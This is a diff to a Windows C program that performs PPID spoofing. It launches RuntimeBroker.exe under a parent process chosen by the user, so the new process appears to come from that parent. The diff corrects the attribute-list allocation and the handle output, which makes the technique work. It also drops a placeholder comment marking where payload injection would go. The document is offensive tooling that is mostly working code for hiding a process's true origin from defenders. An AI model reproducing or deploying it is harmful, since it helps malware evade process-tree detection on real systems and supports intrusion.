@@ -1,8 +1,10 @@
 #include <Windows.h>
 #include <stdio.h>
 
+#pragma warning (disable:4996)
 
 
+#define TARGET_PROCESS		"RuntimeBroker.exe -Embedding"
 
 // Steps to do the PPID Spoofing
 // 1 - Create a Process using  EXTENDED_STARTUPINFO_PRESENT FLAG
@@ -15,12 +17,11 @@
 
 
 BOOL CreatePPidSpoofedProcess(IN HANDLE hParentProcess, IN LPCSTR lpProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread) {
-	HANDLE hProcess;
 	CHAR					lpPath[MAX_PATH * 2];
 	CHAR					WnDr[MAX_PATH];
 	CHAR					CurrentDir[MAX_PATH];
 
-	SIZE_T sThreadSize = NULL;
+	SIZE_T							sThreadAttList = NULL;
 	PPROC_THREAD_ATTRIBUTE_LIST		pThreadAttList = NULL;
 
 	STARTUPINFOEXA SiEx = { 0 };
@@ -31,8 +32,6 @@ BOOL CreatePPidSpoofedProcess(IN HANDLE hParentProcess, IN LPCSTR lpProcessName,
 	RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));
 
 
-	sprintf(lpPath, "%s\\System32\\%s", WnDr, lpProcessName);
-	sprintf(CurrentDir, "%s\\System32\\", WnDr);
 
 
 	SiEx.StartupInfo.cb = sizeof(STARTUPINFOEXA);
@@ -45,16 +44,23 @@ BOOL CreatePPidSpoofedProcess(IN HANDLE hParentProcess, IN LPCSTR lpProcessName,
 		return FALSE;
 	}
 
+	sprintf(lpPath, "%s\\System32\\%s", WnDr, lpProcessName);
 
-	
-	pThreadAttList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sThreadSize);
+	sprintf(CurrentDir, "%s\\System32\\", WnDr);
+
+
+	InitializeProcThreadAttributeList(NULL, 1, NULL, &sThreadAttList);
+
+	// allocating enough memory
+	pThreadAttList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sThreadAttList);
 	if (pThreadAttList == NULL) {
-		printf("[!] HeapAlloc Failed With Error : %d \n",GetLastError());
+		printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
 		return FALSE;
 	}
 
-	if (!InitializeProcThreadAttributeList(NULL, 1, NULL, &sThreadSize)) {
-		printf("Initializing proc thread attribute list has failed !! error : %d\n",GetLastError());
+	// calling InitializeProcThreadAttributeList again passing the right parameters
+	if (!InitializeProcThreadAttributeList(pThreadAttList, 1, NULL, &sThreadAttList)) {
+		printf("[!] InitializeProcThreadAttributeList Failed With Error : %d \n", GetLastError());
 		return FALSE;
 	}
 
@@ -70,13 +76,13 @@ BOOL CreatePPidSpoofedProcess(IN HANDLE hParentProcess, IN LPCSTR lpProcessName,
 
 
 	if (!CreateProcessA(NULL, lpPath, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &SiEx.StartupInfo, &Pi)) {
-		printf("Can't create the process !!!!\n");
+		printf("Can't create the process !!!!, error : %d\n",GetLastError());
 		return FALSE;
 	}
 
 	*dwProcessId = Pi.dwProcessId;
 	*hProcess = Pi.hProcess;
-	hThread = Pi.hThread;
+	*hThread = Pi.hThread;
 
 	DeleteProcThreadAttributeList(pThreadAttList);
 	CloseHandle(hParentProcess);
@@ -92,16 +98,13 @@ int main(int argc, char* argv[]) {
 		printf("Please enter the parent ID \n");
 		return -1;
 	}
-	DWORD		dwPPid = atoi(argv[1]),
-				dwProcessId = NULL;
+	DWORD		dwPPid = atoi(argv[1]),dwProcessId = NULL;
 
-	HANDLE		hPProcess = NULL,
-		hProcess = NULL,
-		hThread = NULL;
+	HANDLE		hPProcess = NULL,hProcess = NULL,hThread = NULL;
 
 	// openning a handle to the parent process
 	if ((hPProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPPid)) == NULL) {
-		printf("[!] OpenProcess Failed with Error : %d \n", GetLastError());
+		printf("OpenProcess Failed with Error : %d \n", GetLastError());
 		return -1;
 	}
 
@@ -112,11 +115,6 @@ int main(int argc, char* argv[]) {
 	}
 	printf("[i] Target Process Created With Pid : %d \n", dwProcessId);
 
-	/*
-
-		payload injection code here (for example)
-
-	*/
 
 
 	printf("[#] Press <Enter> To Quit ... ");
